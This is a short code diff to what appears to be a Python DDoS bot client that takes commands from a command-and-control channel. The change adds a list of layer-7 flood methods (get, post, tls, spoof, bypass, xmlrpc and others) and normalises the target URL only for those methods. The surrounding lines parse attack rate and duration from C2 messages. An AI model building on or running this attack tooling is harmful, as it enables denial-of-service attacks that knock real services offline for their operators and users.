@@ -224,10 +224,12 @@ def main():
                 rpc = int(c2.split()[5])
                 timme = int(c2.split()[6])
                 timer = time() + timme
-                if "https" and "http" in url:
-                    pass
-                else:
-                    url = ('http://'+url)
+                layer7 = ["raw" , "get" , "tls" , "spoof" , "put" , "bypass" , "mix" , "post" , "browser" , "http" , "http-mix" , "xmlrpc"]
+                if method in layer7:
+                    if "https" and "http" in url:
+                        pass
+                    else:
+                        url = ('http://'+url)
                 while 1:
                     try:
                         if c2.split()[0] == '[+]ping':
